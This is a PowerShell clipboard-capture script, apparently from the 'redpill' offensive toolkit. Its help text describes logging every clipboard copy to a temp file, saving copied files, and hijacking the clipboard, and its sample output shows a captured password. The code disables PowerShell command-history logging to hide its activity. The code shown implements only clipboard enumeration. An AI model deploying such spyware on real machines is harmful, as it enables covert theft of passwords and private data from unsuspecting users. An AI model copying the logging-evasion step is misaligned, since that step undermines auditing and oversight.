<#
.SYNOPSIS
   Capture clipboard text\file\image\audio contents!

   Author: r00t-3xp10it
   Tested Under: Windows 10 (19042) x64 bits
   Required Dependencies: Assembly PresentationCore {native}
   Optional Dependencies: none
   PS cmdlet Dev version: v2.2.9

.DESCRIPTION
   This module captures clipboard content everytime the clipboard its used!
   The clipboard is a section of RAM where your computer stores copied data.
   This can be a selection of text, an image, a file, or other type of data
   it is placed in the clipboard whenever you use the "Copy" (CTRL+C) command.  

.NOTES
   If sellected the parameter -Action '<Capture>' then this cmdlet start
   capture clipboard for a specified amount of time defined by -CaptureTime
   If sellected -Forensic '<True>' then this cmdlet will store files, images,
   audio files beeing passed to clipboard into '$Env:TMP\Forensic' directory!
   
.Parameter Action
   Accepts arguments: Enum, Capture, Prank (default: Enum)

.Parameter Database
   [Capture] The path where to store captures (default: $Env:TMP\clipboard.log)

.Parameter CaptureTime
   [Capture] The amount of time in seconds to capture clipboard (default: 30)

.Parameter GetStrings
   [Capture] The interval in seconds for query clipboard contents (default: 2)
   
.Parameter Forensic
   [Capture] Store the documents beeing passed to the clipboard? (default: false)
   
.Parameter SetText
   [Prank] The text data to overwrite the clipboard with (default: Eureka)

.Parameter SetPath
   [Prank] The path to overwrite the clipboard with (default: $Env:WINDIR\System32\calc.exe)

.EXAMPLE
   PS C:\> Get-Help .\Clipboard.ps1 -full
   Access this cmdlet comment based help

.EXAMPLE
   PS C:\> .\Clipboard.ps1 -Action Enum
   Capture current clipboard text\file\image\audio!

.EXAMPLE
   PS C:\> .\Clipboard.ps1 -Action Capture -CaptureTime "10" -Database "$Env:TMP\clip.log"
   Capture clipboard contents for 10 seconds total time into -Database '<string>' directory!
   
.EXAMPLE
   PS C:\> .\Clipboard.ps1 -Action Capture -CaptureTime "30" -Forensic True
   Capture clipboard contents for 30 sec and Store files beeing passed to clipboard!
   Remark: This function creates 'Forensic' folder under %TMP% directory for storage!
   
.EXAMPLE
   PS C:\> .\Clipboard.ps1 -Action Prank -CaptureTime "15" -SetText "HACKED" -SetPath "$Env:TMP"
   Overwrite clipboard data for 15 seconds by -SetText '<string>' and -SetPath '<string>' values!
   Remark: This function set's the clipboard to our data every 2 sec until -CaptureTime its reached!

.INPUTS
   None. You cannot pipe objects into Clipboard.ps1

.OUTPUTS
   * Capture SKYNET clipboard for 30 seconds time!
     => logfile 'C:\Users\pedro\AppData\Local\Temp\clip.log'

   [07:54:26] whoami
   [07:54:28] myS3cr3tpAss
   [07:54:30] netstat -ano|findstr "ESTABLISHED"
   [07:54:32] C:\Users\pedro\music\ironmaiden\eddie.mp4
   [07:54:34] C:\Users\pedro\images\praiadasamoqueira.jpg
   [07:54:36] C:\Users\pedro\Coding\redpill\bin\NoAmsi.ps1
   
.LINK
   https://github.com/r00t-3xp10it/redpill
   https://docs.microsoft.com/en-us/dotnet/api/system.windows.forms.clipboard
   https://gist.github.com/r00t-3xp10it/1843ade5ae4ac981e95007f9d4e607f1#gistcomment-3861483
#>


[CmdletBinding(PositionalBinding=$false)] param(
   [string]$SetPath="$Env:WINDIR\System32\calc.exe",
   [string]$Database="$Env:TMP\clipboard.log",
   [string]$SetText="Eureka",
   [string]$Forensic="false",
   [string]$Action="Enum",
   [int]$CaptureTime='30',
   [int]$GetStrings='2'
)


Write-Host ""
$ForensicDirectory = "$Env:TMP\Forensic"
$ErrorActionPreference = "SilentlyContinue"
Add-Type -Assembly PresentationCore|Out-Null
## Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null

#Cmdlet mandatory requirement tests!
If(-not(([appdomain]::currentdomain.GetAssemblies()).Location -iMatch '(PresentationCore.dll)$'))
{
   Write-Host "`nERROR: failed to Add-Assembly-Type 'PresentationCore'!`n" -ForeGroundColor Red -BackGroundColor Black
   exit #Exit @clipboard
}
If(-not($Action -iMatch '^(Enum|Capture|Prank)$'))
{
   Write-Host "`nERROR: Bad -Action '<string>' argument input!`n" -ForeGroundColor Red -BackGroundColor Black
   Start-Sleep -Seconds 3;Get-Help .\clipboard.ps1 -Detailed;exit #Exit @clipboard
}


If($Action -ieq "Enum")
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Display clipboard text\file\image\audio contents!
      
   .OUTPUTS
      * Display SKYNET current clipboard contents!
        => formats: cmdline, text, file, image, audio.
        
      [capture] netstat -ano|findstr "ESTABLISHED"
   #>

   #Banner
   Write-Host "`n* Display $Env:COMPUTERNAME current clipboard contents!" -ForegroundColor Green
   Write-Host "  => formats: cmdline, text, file, image, audio.`n" -ForegroundColor DarkCyan

   #Display clipboard contents!
   If([Windows.Clipboard]::ContainsFileDropList())
   {
      Write-Output ("[capture] "+[Windows.Clipboard]::GetFileDropList())
   }
   ElseIf([Windows.Clipboard]::ContainsText())
   {
      Write-Output ("[capture] "+[Windows.Clipboard]::GetText().split("`n"))
   }
   ElseIf([Windows.Clipboard]::ContainsImage())
   {
      Write-Output ("[capture] "+[Windows.Clipboard]::GetImage())
   }
   ElseIf([Windows.Clipboard]::ContainsAudio())
   {
      Write-Output ("[capture] "+[Windows.Clipboard]::GetAudio())
   }
   Else
   {
      Write-Host "`nERROR: None clipboard contents found under $Env:COMPUTERNAME!" -ForegroundColor Red -BackgroundColor Black
   }
   Write-Host "`n`n"

}
